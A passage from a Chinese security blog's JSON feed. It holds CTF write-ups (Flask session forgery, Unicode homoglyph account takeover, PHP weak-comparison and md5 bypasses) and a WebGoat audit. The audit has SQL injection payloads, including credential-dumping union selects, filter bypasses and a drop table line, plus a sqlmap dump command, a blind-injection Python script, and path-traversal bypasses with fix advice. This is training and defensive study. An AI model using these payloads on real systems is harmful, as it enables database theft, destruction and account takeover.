class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% include(<span class=\"string\">&#x27;header.html&#x27;</span>) %&#125;</span><br><span class=\"line\">&#123;% <span class=\"keyword\">if</span> current_user.is_authenticated %&#125;</span><br><span class=\"line\">&lt;h1 <span class=\"class\"><span class=\"keyword\">class</span>=&quot;<span class=\"title\">nav</span>&quot;&gt;<span class=\"title\">Hello</span> &#123;&#123; <span class=\"title\">session</span>[&#x27;<span class=\"title\">name</span>&#x27;] &#125;&#125;&lt;/<span class=\"title\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\">&#123;% <span class=\"title\">endif</span> %&#125;</span></span><br><span class=\"line\"><span class=\"class\">&#123;% <span class=\"title\">if</span> <span class=\"title\">current_user</span>.<span class=\"title\">is_authenticated</span> <span class=\"title\">and</span> <span class=\"title\">session</span>[&#x27;<span class=\"title\">name</span>&#x27;] == &#x27;<span class=\"title\">admin</span>&#x27; %&#125;</span></span><br><span class=\"line\"><span class=\"class\">&lt;<span class=\"title\">h1</span> <span class=\"title\">class</span>=&quot;<span class=\"title\">nav</span>&quot;&gt;<span class=\"title\">hctf</span>&#123;<span class=\"title\">xxxxxxxxx</span>&#125;&lt;/<span class=\"title\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\">&#123;% <span class=\"title\">endif</span> %&#125;</span></span><br><span class=\"line\"><span class=\"class\">&lt;!-- <span class=\"title\">you</span> <span class=\"title\">are</span> <span class=\"title\">not</span> <span class=\"title\">admin</span> --&gt;</span></span><br><span class=\"line\"><span class=\"class\">&lt;h1 <span class=\"keyword\">class</span>=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"class\">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span></span><br></pre></td></tr></table></figure>\n<p xxxxxxxxx=\"\">当 session 中的 name=admin 时，会输出 flaghctf</p>\n<p>但是 flask session 加密需要秘钥，在 config.py 中找到 SECRET_KEY=os.environ.get (‘SECRET_KEY’) or ‘ckj123’</p>\n<p><img src=\"buuctf-web11.png\" alt=\"buuctf-web11\"></p>\n<p>利用<a href=\"https://github.com/noraj/flask-session-cookie-manager\"> flask_session 加解密工具</a>进行 session 加解密</p>\n<p>将以下数据加密</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;22ef025f1846ed290c3abc33091af4789157e04648638256aa7b8d41e4e27adfa91e24e72c43d5d81353bd327192646b54ca6b77e66626aab5f3d7521feba4ef&#x27;, &#x27;csrf_token&#x27;: b&#x27;62c673754392025e9b7ce0ec4fe937415e76df71&#x27;, &#x27;image&#x27;: b&#x27;wlBG&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"buuctf-web8.png\" alt=\"\"></p>\n<p>拿到 flag，好耶ヾ (✿ﾟ▽ﾟ) ノ</p>\n<p>🎀再来撸一下<a href=\"http://xdxd.love/2016/10/17/unicode%E5%90%8C%E5%BD%A2%E5%AD%97%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/\"> unicode 同形字引起的安全问题</a></p>\n<p>在这里 <code>Twisted库的版本是10.0.0</code></p>\n<p>nodeprep.prepare () 函数，第一次调用：会把其他类的编码转为 ascii 码，第二次调用：内容转为小写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ᴬᴰᴹᴵᴺ —&gt; ADMIN —&gt; admin</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://xn--rutes-ck2hx70mgflissmgc.py\">查看源代码 rutes.py</a>，自定义一个转小写函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">strlower</span>(<span class=\"params\">username</span>):</span>    username = nodeprep.prepare(username)    <span class=\"keyword\">return</span> username</span><br></pre></td></tr></table></figure>\n<p>在三个功能点处都调用过一次该函数：register、login、change</p>\n<p>在登录时，会调用 strlower ()，将ᴬᴰᴹᴵᴺ 转成 ADMIN，存储在 session 中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:        name = strlower(form.username.data)        session[<span class=\"string\">&#x27;name&#x27;</span>] = name</span><br></pre></td></tr></table></figure>\n<p>因此，我们注册一个账户名为ᴬᴰᴹᴵᴺ的用户，登录后欢迎界面会显示 ADMIN</p>\n<img src=\"buuctf-web9.png\" style=\"zoom:50%;\" />\n<p>修改密码时，同样会再次调用 strlower ()，将 ADMIN 转成 admin，存储在 session 中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:        name = strlower(session[<span class=\"string\">&#x27;name&#x27;</span>])        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(<span class=\"string\">&#x27;change successful&#x27;</span>)        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure>\n<p>因此此时我们修改的密码为 admin 的密码</p>\n<p>然后嚯嚯嚯拿到 flag ヾ (･ω･`｡)</p>\n<p>🎀大失败</p>\n<p>因为登录时，是先写入 session，再判断该账户是否登录成功</p>\n<p>改密码时，需要获取 session，再进行密码修改</p>\n<p>因此在登录写入 session 之后，判断用户是否登录成功销毁 session 之前，此时修改密码，就可以成功修改登录用户的密码</p>\n<p>但是我没有看见 login 处登录失败时，会销毁 session</p>\n<p>🐴所以先在火狐上登录一个随便注册的账号，打开更改密码界面</p>\n<p>🐴再在谷歌上登录 admin 账号（随便输入密码）</p>\n<p>🐴最后修改密码</p>\n<p>用修改的密码登录 admin 账号失败</p>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://blog.csdn.net/weixin_44677409/article/details/100733581\">此题三种解法</a></p>\n<p><a href=\"https://www.jianshu.com/p/278d4f59839d\">flask session</a></p>\n<p><a href=\"https://chenlvtang.github.io/2020/05/14/Unicode%E5%B0%8F%E9%AA%97%E5%AD%90/#%E4%B8%BE%E4%B8%AA%F0%9F%8C%B0-HCTF2018-admin\">Unicode 小骗子</a></p>\n<p>php 弱类型比较表</p>\n<p><img src=\"buuctf-web10.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"极客大挑战-2019-buyflag\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019-buyflag\">#</a> 极客大挑战 2019 BuyFlag</h2>\n<p><em>关键词：php、strcmp () 绕过</em></p>\n<p>🎀查看 pay.php 源码，发现提示</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~~~post money <span class=\"keyword\">and</span> password~~~<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_numeric(<span class=\"variable\">$password</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;\t\t\t&#125;<span class=\"keyword\">elseif</span> (<span class=\"variable\">$password</span> == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Password Right!&lt;/br&gt;&quot;</span>;\t</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>password 弱比较，password=404a</p>\n<p>🎀根据 Flag need your 100000000 money，可以使用科学计数法 1e9，也可以通过<a href=\"https://blog.csdn.net/cherrie007/article/details/77473817\"> strcmp 漏洞</a>，进行绕过</p>\n<p>money []=a 或者 money=1e9 都可以</p>\n<p>🎀根据 You must be a student from CUIT，大概率是在 cookie 处验证身份信息</p>\n<p>发现 cookie 处有一个 user=0，改成 user=1 即可通过验证</p>\n<hr>\n<h2 id=\"bjdctf2020-easy-md5\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf2020-easy-md5\">#</a> BJDCTF2020 Easy MD5</h2>\n<p><em>关键词：php、md5 () 绕过</em></p>\n<p>抓包看见响应包中的提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hint: select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>\n<p>看题如果正常 md5 加密 pass 这个逻辑，肯定注不进去哇</p>\n<p>辣就去找关于 md5 () 这个函数的漏洞</p>\n<blockquote>\n<p>语法：md5 (string,raw)</p>\n<p><strong>string</strong>: 所需加密的字符串</p>\n<p><strong>raw</strong>: 可选参数 TRUE 或 FALSE。FALSE（默认，32 字符十六进制数）；TRUE（原始 16 字符二进制格式）</p>\n</blockquote>\n<p>也就是说当第二个参数为 true 时，返回的是原始 16 字符二进制格式的散列值，会被当做 ascii 码字符串处理（？）</p>\n<p>⭐原始二进制数据指原始字符串转换成 ascii 码后组成的字符串</p>\n<p>所以只需要找到一个 str，经过 md5 (str, true) 加密后，再转成 ascii 码字符串，包含我们需要注入的字符即可</p>\n<p>看 sql 语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>\n<p>将 where 后的条件恒为真时，我们就可获取 admin 表中的所有数据</p>\n<p>🐴能用的字符串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: 129581926211651571912466741651878684928hex: 06da5430449f8f6f23dfc1276f722738raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8string: T0Do#&#x27;or&#x27;8content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: &#x27;or&#x27;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1cstring: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>\n<p>当且仅当 or 后字符串开头字符为 0 时，返回 false</p>\n<p>输入 payload，跳转至 levels91.php，源码中包含提示：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];<span class=\"variable\">$b</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];<span class=\"keyword\">if</span>(<span class=\"variable\">$a</span> != <span class=\"variable\">$b</span> &amp;&amp; md5(<span class=\"variable\">$a</span>) == md5(<span class=\"variable\">$b</span>))&#123;    <span class=\"comment\">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure>\n<p>当字符串 a，b 不相等，md5 加密后的字符串相等后，进入 if 中没有放出来的代码</p>\n<p>⭐5️⃣⑧訾 Dao の 4：md5 () 或者 sha1 () 之类的函数计算的是一个字符串的哈希值，对于数组则返回 false，如果<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mtext>和</mtext></mrow><annotation encoding=\"application/x-tex\">a和</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">和</span></span></span></span> b 都是数组则双双返回 FALSE, 两个 FALSE 相等得以绕过</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?a[]=111&amp;b[]=www</span><br></pre></td></tr></table></figure>\n<p>跳转至 levell14.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>error_reporting(<span class=\"number\">0</span>);<span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;highlight_file(<span class=\"keyword\">__FILE__</span>);<span class=\"keyword\">if</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param1&#x27;</span>]!==<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param1&#x27;</span>])===md5(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param2&#x27;</span>]))&#123;    <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;&#125; </span><br></pre></td></tr></table></figure>\n<p>payload (POST 请求):</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>\n<p>一样の zsd</p>\n<p><strong>参考链接</strong></p>\n<p><a href=\"https://blog.csdn.net/iczfy585/article/details/106081299\">PHP 中 md5 常见绕过</a></p>\n<p><a href=\"https://www.w3school.com.cn/php/func_string_md5.asp\">PHP_md5 函数</a></p>\n<p><a href=\"https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/\">探究 php 的 MD5 函数输出的原始二进制数据是啥？</a></p>\n<p><a href=\"https://www.cnblogs.com/wangtanzhi/p/12304899.html\">哒暗</a></p>\n<hr>\n<p>未完待续…</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2021/01/28/webgoat%E5%AE%A1%E8%AE%A1/",
            "url": "http://example.com/2021/01/28/webgoat%E5%AE%A1%E8%AE%A1/",
            "title": "webgoat审计",
            "date_published": "2021-01-28T01:28:50.000Z",
            "content_html": "<h1 id=\"搭建概述\"><a class=\"markdownIt-Anchor\" href=\"#搭建概述\">#</a> 搭建概述</h1>\n<p>前提：</p>\n<ul>\n<li>Java 11</li>\n<li>Maven &gt; 3.2.1</li>\n<li>IDEA</li>\n</ul>\n<p>下载源码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/WebGoat/WebGoat.git</span><br></pre></td></tr></table></figure>\n<p>打开 idea 导入 maven 项目，build 完成之后，打开 localhost:8080/WebGoat，注册账户</p>\n<h1 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\">#</a> Sql 注入</h1>\n<p>select department from employees where first_name=‘Bob’</p>\n<p>update employees set department=‘Sales’ where first_name=‘Barnett’</p>\n<p>alter table employees add column phone varchar(20)</p>\n<p>grant alter table to UnauthorizedUser</p>\n<p>12:’; update employees set salary=1000000 where last_name=‘Smith’;–</p>\n<p>13:’; drop table access_log;-- -</p>\n<h2 id=\"漏洞描述\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述\">#</a> 漏洞描述</h2>\n<p>当应用程序将用户输入的内容，拼接到 SQL 语句中，一起提交给数据库执行时，就会产生 SQL 注入威胁。攻击者通过控制部分 SQL 语句，可以查询数据库中任何需要的数据，利用数据库的一些特性，甚至可以直接获取数据库服务器的系统权限。</p>\n<h2 id=\"漏洞成因\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因\">#</a> 漏洞成因</h2>\n<p>字符拼接的方式拼接 sql 语句，并且没有做任何过滤直接执行</p>\n<h2 id=\"代码片段以及修复建议\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议\">#</a> 代码片段以及修复建议</h2>\n<ol>\n<li>\n<p>sql-injection–&gt;SQLInjectionChanllenge</p>\n<p>使用预编译 PrepareStatement，实现数据代码分离</p>\n<p><img src=\"sql1.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p>根据代码找到注入点，用 sqlmap 跑，payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -r 1.txt --method PUT --data &quot;username_reg&quot; -D PUBLIC -T CHALLENGE_USERS -C password --dump</span><br></pre></td></tr></table></figure>\n<p>但是可能由于服务器的原因，跑了很久，还跑错了，密码应该是 thisisasecretfortomonly</p>\n<p><img src=\"sql9.png\" alt=\"\"></p>\n</li>\n<li>\n<p>sql-injection–&gt;SQLInjectionLesson6a</p>\n<p>使用预编译 PrepareStatement，实现数据代码分离<img src=\"sql2.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p>payload (注意字段类型要对应)：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27; union select userid,user_name,password, cookie,&#x27;&#x27;,&#x27;&#x27;,0 from user_system_data --</span><br></pre></td></tr></table></figure>\n<p><img src=\"sql8.png\" alt=\"\"></p>\n</li>\n<li>\n<p>sql-injection–&gt;Servers</p>\n<p>列名不能加双引号，所以只能用字符拼接的方式拼接 sql 语句，建议对列名进行白名单过滤</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> List&lt;Server&gt; <span class=\"title\">sort</span><span class=\"params\">(<span class=\"meta\">@RequestParam</span> String column)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        List&lt;Server&gt; servers = <span class=\"keyword\">new</span> ArrayList&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> (Connection connection = dataSource.getConnection();</span><br><span class=\"line\">             PreparedStatement preparedStatement = connection.prepareStatement(<span class=\"string\">&quot;select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#x27;out of order&#x27; order by &quot;</span> + column)) &#123;</span><br><span class=\"line\">            ResultSet rs = preparedStatement.executeQuery();</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (rs.next()) &#123;</span><br><span class=\"line\">                Server server = <span class=\"keyword\">new</span> Server(rs.getString(<span class=\"number\">1</span>), rs.getString(<span class=\"number\">2</span>), rs.getString(<span class=\"number\">3</span>), rs.getString(<span class=\"number\">4</span>), rs.getString(<span class=\"number\">5</span>), rs.getString(<span class=\"number\">6</span>));</span><br><span class=\"line\">                servers.add(server);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> servers;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"sql4.png\" alt=\"\"></p>\n<p>测试截图:</p>\n<p>sqlmap 不太好使，太慢了，然后就看见大佬写的脚本</p>\n<p>布尔盲注，根据返回数据的排序来判断真假 (tql)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> string <span class=\"keyword\">import</span> digits</span><br><span class=\"line\">chars = digits+<span class=\"string\">&quot;.&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;X-Requested-With&#x27;</span>: <span class=\"string\">&#x27;XMLHttpRequest&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">cookies = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;JSESSIONID&#x27;</span>: <span class=\"string\">&#x27;D81iy9aS29fcA8JZUl1QEdeNBahRWoMFk8YyziGj&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;JSESSIONID.75fbd09e&#x27;</span>: <span class=\"string\">&#x27;7mc1x9iei6ji4xo2a3u4kbz1&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\">result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">proxy=&#123;<span class=\"string\">&quot;http&quot;</span>: <span class=\"string\">&quot;http://127.0.0.1:6666&quot;</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    i += <span class=\"number\">1</span></span><br><span class=\"line\">    temp = result</span><br><span class=\"line\">    <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> chars:</span><br><span class=\"line\">        vul_url = <span class=\"string\">&quot;http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;%20from%20servers%20where%20hostname=&#x27;webgoat-prd&#x27;)%20then%20hostname%20else%20mac%20end&quot;</span>.<span class=\"built_in\">format</span>(i, char)</span><br><span class=\"line\">        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)</span><br><span class=\"line\">        <span class=\"comment\"># print(resp.json())</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;webgoat-acc&#x27;</span> <span class=\"keyword\">in</span> resp.json()[<span class=\"number\">0</span>][<span class=\"string\">&#x27;hostname&#x27;</span>]:</span><br><span class=\"line\">            result += char</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(result)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> temp == result:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;select * from table where </span></span><br><span class=\"line\"><span class=\"string\">column = </span></span><br><span class=\"line\"><span class=\"string\">case</span></span><br><span class=\"line\"><span class=\"string\">when (select substr(ip,&#123;0&#125;,1) = &#x27;&#123;1&#125;&#x27; from server where  hostname = &#x27;webgoat-prd&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">then hostname</span></span><br><span class=\"line\"><span class=\"string\">else mac end&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"sql12.png\" alt=\"\"></p>\n</li>\n<li>\n<p>sql-injection–&gt;SqlOnlyInputValidation</p>\n<p>限制用户输入内容不能包含空格，但是可以通过过 /**/ 注释，括号等绕过，过滤空格后直接调用 SQLInjectionLesson6a 的注入函数（字符拼接执行并直接输出结果），修复建议同 SQLInjectionLesson6a</p>\n<p><img src=\"sql5.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;/**/union/**/select/**/userid,user_name,password,cookie,&#x27;&#x27;,&#x27;&#x27;,0/**/from/**/user_system_data/**/--/**/</span><br></pre></td></tr></table></figure>\n<p><img src=\"sql10.png\" alt=\"\"></p>\n</li>\n<li>\n<p>sql-injection–&gt;SqlOnlyInputValidationOnKeywords</p>\n<p>对用户输入进行关键字’select’ 'from’进行了一次判断置空，并限制用户输入不能包含空格，可以通过双写 + 注释绕过绕过，建议使用预编译</p>\n<p><img src=\"sql6.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;/**/union/**/selecselectt/**/userid,user_name,password,cookie,&#x27;&#x27;,&#x27;&#x27;,0/**/frfromom/**/user_system_data/**/--/**/</span><br></pre></td></tr></table></figure>\n<p><img src=\"sql11.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"任意文件上传\"><a class=\"markdownIt-Anchor\" href=\"#任意文件上传\">#</a> 任意文件上传</h1>\n<h2 id=\"漏洞描述-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-2\">#</a> 漏洞描述</h2>\n<p>文件上传功能允许用户将本地的文件通过 Web 页面提交到网站服务器上，但是如果不对用户上传的文件进行合法性验证，则攻击者可利用 Web 应用系统文件上传功能（如文件上传、图像上传等）的代码缺陷来上传任意文件或者 webshell，并在服务器上运行，以达到获取 Web 应用系统控制权限或其他目的。</p>\n<h2 id=\"漏洞成因-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-2\">#</a> 漏洞成因</h2>\n<p>未对用户输入的参数进行合法性验证</p>\n<h2 id=\"代码片段以及修复建议-2\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-2\">#</a> 代码片段以及修复建议</h2>\n<ol>\n<li>\n<p>path-traversal–&gt;ProfileUpload</p>\n<p>获取前端上传的文件以及字符串 “fullName”</p>\n</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@PostMapping(value = &quot;/PathTraversal/profile-upload&quot;, consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)</span></span><br><span class=\"line\"> <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">public</span> AttackResult <span class=\"title\">uploadFileHandler</span><span class=\"params\">(<span class=\"meta\">@RequestParam(&quot;uploadedFile&quot;)</span> MultipartFile file, <span class=\"meta\">@RequestParam(value = &quot;fullName&quot;, required = false)</span> String fullName)</span> </span>&#123;</span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.execute(file, fullName);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>调用父类 ProfileUploadBase，execute () 方法，判断文件和 &quot;fullName&quot; 非空后直接上传，并且 “fullName” 用作子路径名字符串</p>\n<p><img src=\"sql7.png\" alt=\"\"></p>\n<p>修复建议</p>\n<ol>\n<li>对 fullName 进行判断过滤</li>\n<li>使用适当的权限保护文件夹</li>\n<li>随机化重命名用户上传的文件名</li>\n<li>根据用户上传的文件类型重构文件</li>\n</ol>\n<p>测试截图：</p>\n<p><img src=\"pt01.png\" alt=\"\"><img src=\"pt02.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li>path-traversal–&gt;ProfileUploadFix</li>\n</ol>\n<p>对 “fullName” 过滤了 “…/”，但是因为 replace 并不能递归检测，所以可以通过双写绕过 (’…/./’)，修复建议同上</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> AttackResult <span class=\"title\">uploadFileHandler</span><span class=\"params\">(            <span class=\"meta\">@RequestParam(&quot;uploadedFileFix&quot;)</span> MultipartFile file,            <span class=\"meta\">@RequestParam(value = &quot;fullNameFix&quot;, required = false)</span> String fullName)</span> 